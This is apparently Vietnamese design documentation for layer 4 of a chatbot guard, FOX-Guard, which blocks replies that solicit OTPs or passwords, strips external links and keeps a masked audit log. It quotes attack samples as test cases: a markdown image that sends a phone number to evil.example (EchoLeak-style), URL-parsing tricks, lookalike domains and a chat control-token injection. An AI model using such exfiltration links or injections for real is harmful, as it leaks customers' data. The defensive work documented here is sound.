# Lớp 4 — Kiểm đầu ra, policy 4 hành động và audit đã che

> Cập nhật 07/11/2026. Code: `src/fox_guard/detectors/output.py`, `detectors/url.py`, `policy/engine.py`, `audit/store.py`, `guard.py`. Đọc sau [Lớp 3](lop-3-pii.md).

## 1. Lớp này chặn rủi ro gì?

Lớp 1–3 chỉ **báo tín hiệu** và **che PII**. Từ Lớp 4, guard bắt đầu **chặn thật**.

| Rủi ro | Ví dụ trong shop | Lớp 4 làm gì |
| --- | --- | --- |
| P4: bot bị dụ **đòi** khách đưa bí mật | "Vui lòng gửi mã OTP để shop xác nhận đơn" | Thay cả câu trả lời bằng câu cảnh báo "Shop không bao giờ yêu cầu…" |
| O1/O5: link hoặc ảnh dẫn ra ngoài | `![](https://evil.example/pixel.png?sdt=0912…)` mang SĐT đi khi khách mở chat (kiểu vụ EchoLeak) | Ảnh ngoài bị xoá, link ngoài bị gỡ, link mang PII thì chặn cả câu |
| Tên miền giả dạng | `ѕhop.example` (chữ `ѕ` Cyrillic) | Báo `link:lookalike` (high), gỡ link |
| Quyết định không giải thích được | Hội đồng hỏi "vì sao câu này bị chặn?" | Audit SQLite: lý do, finding, text **đã che**; lệnh `fox-guard audit why <id>` |
| PII nằm trong log | Log giữ nguyên số thật, kể cả dạng `&#53;&#55;…` | Audit chỉ nhận text đã che, xoá mọi đoạn có thể giải mã ngược |

## 2. Cách hoạt động (không cần đọc code)

**Bot đòi bí mật.**
- Một câu trả lời bị coi là đòi bí mật khi có **động từ yêu cầu** (gửi, cung cấp, nhập, đọc, vui lòng, hãy, please…) rồi trong vòng 50 ký tự có **tên một bí mật** (OTP, mã xác thực, mật khẩu, PIN, CCCD, ảnh giấy tờ, số thẻ, CVV, ngày hết hạn, số tài khoản).
- SĐT, địa chỉ, mã số thuế **không có** trong danh sách, nên câu "cho shop xin SĐT người nhận" vẫn hợp lệ.
- Câu **cảnh báo** được cho qua khi từ phủ định chi phối đúng lời yêu cầu: "Shop **không bao giờ** yêu cầu mã OTP" là `allow`. Còn trong "Đừng lo nhé bạn gửi mã OTP", chữ "đừng" chi phối "lo" chứ không phải "gửi", nên câu bị `block`.
- "Hãy" và "hay" (= hoặc) giống nhau khi đã bỏ dấu. Guard đánh dấu "hãy" từ bản **còn dấu**, nên "mã OTP **hay** mật khẩu" là liệt kê, còn "Bạn **hãy** nhắn mã OTP" là lời yêu cầu.
- Lời dẫn kèm danh sách cũng bị bắt: "Vui lòng gửi qua chat:\n- Mã OTP\n- Mật khẩu".

**Link guard: hai lớp.**
- Lớp cuối là **renderer của web**. `markdown-to-jsx` chạy với HTML thô tắt; mọi `href`/`src` đều qua `checkUrlSafety()` dùng `new URL()` của trình duyệt.
- FOX-Guard là **lớp thứ hai**. Nó gỡ link ngoài, phát hiện PII trong URL và ghi lý do vào audit.
- Host được đọc **đúng như trình duyệt đọc** (`detectors/url.py`, theo chuẩn WHATWG). `https:///evil.example`, `/\evil.example`, `shop.example@evil.example` đều ra host `evil.example`.
- Tên miền có ký tự ngoài ASCII (`straße.example`, `ｓｈｏｐ.example`) không bao giờ khớp allowlist.
- Link tới shop chỉ được giữ khi phần sau tên miền gồm toàn ký tự an toàn: không `%`, `@`, `(`, `\`, dấu nháy. Nhờ vậy dữ liệu mã hoá không đi theo link của shop.

**Policy: bảng cố định theo trạm.** PII **không bao giờ** làm tăng rủi ro.

| Trạm | high | medium | không có gì |
| --- | --- | --- | --- |
| INPUT | `block`, trả câu từ chối, không gọi LLM | `review`: vẫn trả lời nhưng app thêm lời nhắc an toàn (`harden_prompt`), đánh dấu phiên | `allow`, hoặc `mask` nếu có PII |
| CONTEXT | `block`: ẩn **cả đoạn** dữ liệu (cắt đúng câu là việc Lớp 5) + `require_confirmation` | `review` + `require_confirmation` | `allow` / `mask` |
| OUTPUT | đòi bí mật hoặc link mang PII thì `block` cả câu; link ngoài đã gỡ thì `mask`; finding high khác thì `block` | `review` | `allow` / `mask` |

**Audit.**
- SQLite chỉ lưu text đã che **không hoàn nguyên được**.
- URL chỉ giữ `scheme://host`, không giữ userinfo.
- Mọi đoạn mà bộ giải mã đọc được (base64, hex, entity, `\u`, `%XX`) bị thay bằng `[đã lược]`.
- Mã người dùng được băm kèm salt lấy từ biến môi trường `FOX_AUDIT_SALT`.
- Khi bộ PII lỗi, audit **không lưu text**.

**PII viết ở dạng mã hoá** (thêm 07/11, PR #4).
- `OTP: &#53;&#55;…` hay `alice%40mail.example` được giải **ngay tại chỗ trong câu** rồi quét lại cả câu.
- Có PII thì che cả đoạn mã hoá, trước khi text đi vào LLM hoặc tới khách. Renderer của web giải entity trong chữ thường, nên khách sẽ thấy số thật nếu không che.

## 3. Chạy thử

```bash
C:/Users/Admin/anaconda3/envs/DL/python.exe -X utf8 scripts/demo_lop4.py
```

Output thật (rút gọn):

```text
1. INPUT — token điều khiển (<|im_start|>)      action=block   risk=high
2. INPUT — câu nghi vấn nhẹ                      action=review  flags=harden_prompt, session_flagged
3. OUTPUT — bot đòi mã OTP                       action=block   → "Shop không bao giờ yêu cầu bạn cung cấp CCCD, mã OTP…"
4. OUTPUT — cảnh báo hợp lệ                      action=allow
5. OUTPUT — link ngoài                           action=mask    → "Bạn mua thêm ở [liên kết ngoài đã bị gỡ] cho rẻ"
6. OUTPUT — ảnh ngoài mang SĐT trong query       action=block   (link:exfil)
7. OUTPUT — tên miền giả dạng shop.example       action=mask    (link:lookalike high, unicode:mixed_script)
8. CONTEXT — ghi chú shipper hợp lệ              action=allow
```

Audit, chạy với `audit.enabled: true`:

```text
check_input("SĐT mình 0912345678, OTP: &#53;&#55;&#50;&#52;&#51;&#49;")
  action = review
  text gửi LLM = SĐT mình <PHONE_1>, OTP: [đã che]

fox-guard audit why <decision_id> --db var/fox_guard.sqlite
  trạm=input  hành động=review  rủi ro=medium  giảm cấp=False
    unicode:encoded [medium] Decoded views: html
    pii:encoded [medium] 1 đoạn mã hoá chứa PII đã che
    pii:VN_PHONE [medium] 0912***678
  văn bản (đã che): SĐT mình 0912***678, OTP: [đã lược]
```

Gõ sai `--db` thì lệnh báo `Không có file audit: …` và thoát với mã 1; nó không tự tạo một DB rỗng.

## 4. Đo được bao nhiêu? (con số thật)

**Held-out độc lập** (`tests/fixtures/output_heldout.jsonl`, 140 câu do OpenCode viết trước khi đọc code, chỉ dùng để đo):

| Nhóm | Kết quả |
| --- | --- |
| Bot đòi bí mật (50 câu) | bắt **45/50 = 90%** |
| Link nguy hiểm (30) | bắt **30/30 = 100%** |
| Câu trả lời hợp lệ (60) | cho qua **58/60 = 97%** |

**Bộ kiểm hệ thống** (`tests/systematic/`): mỗi bộ có **đáp án chuẩn** chứ không phải câu đoán tay. Hiện cả 6 bộ đều 0 lỗi.

| Bộ | Đáp án chuẩn | Quy mô |
| --- | --- | --- |
| S1 | Chính renderer của web + `new URL()` của Node | 9.100 câu |
| S2 | `parse_url` so với chuẩn WHATWG | 1.820 URL |
| S3 | Giải mã lặp nội dung SQLite và JSONL | 4 bí mật × 8 mã hoá × 8 vị trí |
| S4 | Ghép câu, mã hoá, thêm link không được hạ hành động; câu tấn công gốc phải bị bắt | — |
| S5 | 76 câu CSKH hợp lệ phải `allow` và giữ nguyên chữ | — |
| S6 | Text gửi LLM hoặc tới khách không chứa bí mật giải mã được | 3 trạm |

Lần chạy đầu tìm ra **83 ca trong 7 nhóm**, cộng **169 ca** của S6 sau đó; tất cả đã sửa ở chỗ gốc (`docs/reports/systematic-run-1.md`).

Độ trễ: `check_input` cho 2 KB, p95 khoảng **22 ms** trên CPU.

## 5. Code nằm ở đâu?

| Việc | File |
| --- | --- |
| Bot đòi bí mật | `detectors/output.py` (`find_solicitation`, `_negated`, `_join_lists`) |
| Link guard | `detectors/output.py` (`guard_links`), `detectors/url.py` (`parse_url`) |
| Policy | `policy/engine.py` (`decide`, `merge_risk`) |
| Audit | `audit/store.py`, `guard.py` (`_audit`, `_strip_url_tails`, `_drop_encoded`), CLI `cli.py` |
| PII mã hoá | `pii/policy.py` (`mask_encoded_pii`, `safe_evidence`), `normalize/decode.py` (`decoded_spans`) |
| Bộ kiểm | `tests/systematic/` (chạy `python -X utf8 -m tests.systematic.run_report out.md`) |

## 6. Giới hạn

- Bộ bắt "bot đòi bí mật" dựa trên từ vựng. Khoảng 10% held-out vẫn lọt, chủ yếu là tiếng Anh với từ mới ("passport photo", "card expiry") và phủ định phức tạp. Phần phủ định đã **đóng băng** (không thêm danh sách từ); việc này để Lớp 5 (classifier).
- Còn vài câu bị chặn nhầm: "Hãy cẩn thận với tin nhắn đòi mã OTP", hướng dẫn "nhập mật khẩu cũ" trong app.
- CONTEXT `high` ẩn cả đoạn, chưa cắt đúng câu (Lớp 5).
- OTP **không có nhãn** ("Mã của tôi là 572431") không phân biệt được với mã đơn hàng, nên không được che.
- Danh sách đầy đủ: `docs/reports/review-backlog.md`.

## 7. Hội đồng có thể hỏi

1. *Vì sao PII không làm tăng rủi ro?* Khách gõ SĐT của chính mình không phải tấn công. Chặn họ là tự gây hại; chỉ cần che.
2. *Regex bắt link có đủ không?* Không cần đủ một mình: có hai lớp. Bộ S1 chứng minh trên 9.100 câu rằng không ca nào qua được cả hai lớp.
3. *Làm sao chắc audit không lộ PII?* Bộ S3 giải mã lặp toàn bộ file SQLite và JSONL rồi tìm lại giá trị gốc, ở mọi cách mã hoá và mọi vị trí.
4. *Sao không dùng LLM để kiểm đầu ra?* Đắt, chậm, và chính nó có thể bị lừa. Lớp 4 là quy tắc tất định, giải thích được; LLM judge là tuỳ chọn ở Lớp 5.
5. *Vì sao bỏ review bằng tay?* 7 lượt review liên tiếp, mỗi lượt lại có 4–5 ca mới. Bộ kiểm hệ thống tìm ra 83 ca trong một lần chạy.
